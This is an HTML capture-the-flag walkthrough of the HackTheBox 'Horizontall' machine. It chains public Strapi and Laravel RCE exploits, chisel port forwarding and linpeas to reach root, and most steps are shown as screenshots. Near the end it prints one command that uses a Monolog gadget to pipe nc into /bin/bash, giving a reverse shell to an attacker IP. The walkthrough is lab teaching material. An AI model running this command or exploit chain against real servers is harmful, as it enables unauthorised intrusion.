@@ -1,0 +1,399 @@
+<html>
+
+<head>
+    <meta content="text/html; charset=UTF-8" http-equiv="content-type">
+    <style type="text/css">
+        ol {
+            margin: 0;
+            padding: 0
+        }
+
+        table td,
+        table th {
+            padding: 0
+        }
+
+        .c1 {
+            padding-top: 0pt;
+            padding-bottom: 0pt;
+            line-height: 1.15;
+            orphans: 2;
+            widows: 2;
+            text-align: left;
+            height: 11pt
+        }
+
+        .c9 {
+            padding-top: 0pt;
+            padding-bottom: 3pt;
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        .c3 {
+            padding-top: 0pt;
+            padding-bottom: 0pt;
+            line-height: 1.15;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        .c5 {
+            color: #000000;
+            font-weight: 700;
+            text-decoration: none;
+            vertical-align: baseline;
+            font-family: "Arial";
+            font-style: normal
+        }
+
+        .c2 {
+            color: #000000;
+            font-weight: 400;
+            text-decoration: none;
+            vertical-align: baseline;
+            font-family: "Arial";
+            font-style: normal
+        }
+
+        .c8 {
+            text-decoration-skip-ink: none;
+            -webkit-text-decoration-skip: none;
+            color: #1155cc;
+            text-decoration: underline
+        }
+
+        .c7 {
+            background-color: #ffffff;
+            max-width: 468pt;
+            padding: 72pt 72pt 72pt 72pt
+        }
+
+        .c6 {
+            color: inherit;
+            text-decoration: inherit
+        }
+
+        .c4 {
+            font-size: 30pt
+        }
+
+        .c0 {
+            font-size: 17pt
+        }
+
+        .title {
+            padding-top: 0pt;
+            color: #000000;
+            font-size: 26pt;
+            padding-bottom: 3pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        .subtitle {
+            padding-top: 0pt;
+            color: #666666;
+            font-size: 15pt;
+            padding-bottom: 16pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        li {
+            color: #000000;
+            font-size: 11pt;
+            font-family: "Arial"
+        }
+
+        p {
+            margin: 0;
+            color: #000000;
+            font-size: 11pt;
+            font-family: "Arial"
+        }
+
+        h1 {
+            padding-top: 20pt;
+            color: #000000;
+            font-size: 20pt;
+            padding-bottom: 6pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        h2 {
+            padding-top: 18pt;
+            color: #000000;
+            font-size: 16pt;
+            padding-bottom: 6pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        h3 {
+            padding-top: 16pt;
+            color: #434343;
+            font-size: 14pt;
+            padding-bottom: 4pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        h4 {
+            padding-top: 14pt;
+            color: #666666;
+            font-size: 12pt;
+            padding-bottom: 4pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        h5 {
+            padding-top: 12pt;
+            color: #666666;
+            font-size: 11pt;
+            padding-bottom: 4pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+
+        h6 {
+            padding-top: 12pt;
+            color: #666666;
+            font-size: 11pt;
+            padding-bottom: 4pt;
+            font-family: "Arial";
+            line-height: 1.15;
+            page-break-after: avoid;
+            font-style: italic;
+            orphans: 2;
+            widows: 2;
+            text-align: left
+        }
+    </style>
+</head>
+
+<body class="c7 doc-content">
+    <p class="c9 title" id="h.nfhrl9imq1ls"><span class="c4">HACKTHEBOX</span><span class="c4">&nbsp;</span><span
+            class="c4">HORIZONTALL</span><span class="c2 c4">&nbsp;WALKTHROUGH</span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">First we&rsquo;ll start off with nmap:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image18.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Port 22 is open for ssh and port 80 is nginx server so a website is hosted
+            there</span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">We&rsquo;ll check for any subdomains present on this IP:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image11.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c0">The subdomain </span><span class="c0">api-prod.horizontall.htb</span><span
+            class="c2 c0">&nbsp;is present so we&rsquo;ll add it to our /etc/hosts file:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 350.67px;"><img
+                alt="" src="horizontalimages/image16.png"
+                style="width: 624.00px; height: 350.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Now on that domain we find strapi being used which is vulnerable to RCE </span>
+    </p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image3.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c0">So we use the exploit in </span><span class="c0">exploitdb</span><span
+            class="c0">&nbsp;and find one for the current scenario: &ldquo;searchsploit strapi&rdquo;</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image13.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 350.67px;"><img
+                alt="" src="horizontalimages/image9.png"
+                style="width: 624.00px; height: 350.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c3"><span class="c0">Logged in but nothing present here so using the jwt exploit </span><span
+            class="c8 c0"><a class="c6"
+                href="https://www.google.com/url?q=https://github.com/diego-tella/CVE-2019-19609-EXPLOIT&amp;sa=D&amp;source=editors&amp;ust=1659520150916683&amp;usg=AOvVaw23z81Z6HBThvDlslzdJigM">diego-tella/CVE-2019-19609-EXPLOIT</a></span><span
+            class="c2 c0">:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 350.67px;"><img
+                alt="" src="horizontalimages/image17.png"
+                style="width: 624.00px; height: 350.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c3"><span class="c0">And set up a listener on port 4444</span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Got the reverse shell:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image6.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Got the user flag from /home/developer/user.txt</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image14.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c3"><span class="c2 c0">Now finding vulnerabilities using linpeas.sh</span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Transfered linpeas.sh in the victim machine</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image5.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Found that the port 8000 is open and is being used by some service.</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image8.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Found one port which is open on 8000 on the localhost so using chisel and
+            forwarding it:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image1.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">On the Attacking machine set up a reverse port forwarding on 8000:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image20.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">On the victim machine set the reverse port forwarding so that whatever present on
+            the port localhost:8000 on the victim machine will be displayed to us on our localhost:8011 </span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image19.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c0">Found a Laravel page using php version 7.4.18 and this version is vulnerable to
+        </span><span class="c0 c8"><a class="c6"
+                href="https://www.google.com/url?q=https://github.com/nth347/CVE-2021-3129_exploit&amp;sa=D&amp;source=editors&amp;ust=1659520150920629&amp;usg=AOvVaw0YaF2sGTxIeeipsXAje3up">GitHub
+                - nth347/CVE-2021-3129_exploit: Exploit for CVE-2021-3129</a></span><span class="c2 c0">:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image7.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c3"><span class="c2 c0">So getting that exploit and running it on port 8011:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image10.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">We can see that we are ROOT and the RCE was successful:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image15.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c3"><span class="c2 c0">&nbsp;</span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Got the Root flag:</span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 350.67px;"><img
+                alt="" src="horizontalimages/image12.png"
+                style="width: 624.00px; height: 350.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c0 c2"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c1"><span class="c2 c0"></span></p>
+    <p class="c3"><span class="c2 c0">Also using this command we are able to maintain root access for certain time until
+            the chisel latency allows:</span></p>
+    <p class="c3"><span class="c5 c0">./exploit.py http://localhost:8011 Monolog/RCE1 &quot;nc 10.10.14.29 6666|
+            /bin/bash 2&gt;&amp;1 | nc 10.10.14.29 6667&quot;</span></p>
+    <p class="c1"><span class="c5 c0"></span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image4.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+    <p class="c3"><span
+            style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 316.00px;"><img
+                alt="" src="horizontalimages/image2.png"
+                style="width: 624.00px; height: 316.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);"
+                title=""></span></p>
+</body>
+
+</html>
